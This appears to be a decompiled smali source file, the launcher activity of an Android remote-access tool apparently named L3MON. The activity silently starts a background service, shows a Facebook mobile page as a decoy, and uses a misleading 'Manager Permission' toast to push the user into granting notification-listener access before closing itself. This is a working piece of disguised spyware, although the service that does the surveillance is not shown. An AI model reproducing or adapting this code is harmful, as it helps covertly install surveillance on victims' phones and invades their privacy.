.class public Lcom/etechd/l3mon/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 63
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private isNotificationServiceRunning()Z
    .locals 8

    .prologue
    .line 58
    move-object v0, p0

    move-object v6, v0

    invoke-virtual {v6}, Lcom/etechd/l3mon/MainActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v6

    move-object v2, v6

    .line 59
    move-object v6, v2

    const-string v7, "enabled_notification_listeners"

    invoke-static {v6, v7}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    move-object v3, v6

    .line 61
    move-object v6, v0

    invoke-virtual {v6}, Lcom/etechd/l3mon/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v6

    move-object v4, v6

    .line 62
    move-object v6, v3

    if-eqz v6, :cond_0

    move-object v6, v3

    move-object v7, v4

    invoke-virtual {v6, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-nez v6, :cond_1

    :cond_0
    const/4 v6, 0x0

    :goto_0
    move v0, v6

    return v0

    :cond_1
    const/4 v6, 0x1

    goto :goto_0
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 21
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/os/Bundle;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    move-object/from16 v0, p0

    move-object/from16 v1, p1

    move-object v12, v0

    const-string v13, "com.aide.ui.gymkhana"

    invoke-static {v12, v13}, Ladrt/ADRTLogCatReader;->onContext(Landroid/content/Context;Ljava/lang/String;)V

    .line 22
    move-object v12, v0

    move-object v13, v1

    invoke-super {v12, v13}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 24
    move-object v12, v0

    const/high16 v13, 0x7f030000

    invoke-virtual {v12, v13}, Lcom/etechd/l3mon/MainActivity;->setContentView(I)V

    .line 25
    move-object v12, v0

    new-instance v13, Landroid/content/Intent;

    move-object/from16 v20, v13

    move-object/from16 v13, v20

    move-object/from16 v14, v20

    move-object v15, v0

    :try_start_0
    const-string v16, "com.etechd.l3mon.MainService"

    invoke-static/range {v16 .. v16}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v16

    invoke-direct/range {v14 .. v16}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v12, v13}, Lcom/etechd/l3mon/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    move-result-object v12

    .line 26
    move-object v12, v0

    const v13, 0x7f080002

    invoke-virtual {v12, v13}, Lcom/etechd/l3mon/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v12

    check-cast v12, Landroid/webkit/WebView;

    move-object v4, v12

    .line 27
    move-object v12, v4

    invoke-virtual {v12}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v12

    const/4 v13, 0x1

    invoke-virtual {v12, v13}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 28
    move-object v12, v4

    const-string v13, "https://m.facebook.com"

    invoke-virtual {v12, v13}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    .line 29
    move-object v12, v0

    invoke-direct {v12}, Lcom/etechd/l3mon/MainActivity;->isNotificationServiceRunning()Z

    move-result v12

    move v5, v12

    .line 30
    move v12, v5

    if-nez v12, :cond_0

    .line 32
    move-object v12, v0

    invoke-virtual {v12}, Lcom/etechd/l3mon/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v12

    move-object v6, v12

    .line 33
    const-string v12, "Please Enable \'Manager Permission\'"

    move-object v7, v12

    .line 34
    const/4 v12, 0x1

    move v8, v12

    .line 36
    move-object v12, v6

    move-object v13, v7

    move v14, v8

    invoke-static {v12, v13, v14}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v12

    move-object v9, v12

    .line 38
    move-object v12, v9

    invoke-virtual {v12}, Landroid/widget/Toast;->getView()Landroid/view/View;

    move-result-object v12

    const v13, 0x102000b

    invoke-virtual {v12, v13}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v12

    check-cast v12, Landroid/widget/TextView;

    move-object v10, v12

    .line 39
    move-object v12, v10

    const/high16 v13, -0x10000

    invoke-virtual {v12, v13}, Landroid/widget/TextView;->setTextColor(I)V

    .line 40
    move-object v12, v10

    sget-object v13, Landroid/graphics/Typeface;->DEFAULT_BOLD:Landroid/graphics/Typeface;

    invoke-virtual {v12, v13}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;)V

    .line 41
    move-object v12, v10

    const/16 v13, 0x11

    invoke-virtual {v12, v13}, Landroid/widget/TextView;->setGravity(I)V

    .line 42
    move-object v12, v9

    invoke-virtual {v12}, Landroid/widget/Toast;->show()V

    .line 45
    move-object v12, v0

    new-instance v13, Landroid/content/Intent;

    move-object/from16 v20, v13

    move-object/from16 v13, v20

    move-object/from16 v14, v20

    const-string v15, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"

    invoke-direct {v14, v15}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v12, v13}, Lcom/etechd/l3mon/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 52
    :cond_0
    move-object v12, v0

    invoke-virtual {v12}, Lcom/etechd/l3mon/MainActivity;->finish()V

    return-void

    .line 25
    :catch_0
    move-exception v12

    move-object v3, v12

    new-instance v12, Ljava/lang/NoClassDefFoundError;

    move-object/from16 v20, v12

    move-object/from16 v12, v20

    move-object/from16 v13, v20

    move-object v14, v3

    invoke-virtual {v14}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v14

    invoke-direct {v13, v14}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v12
.end method
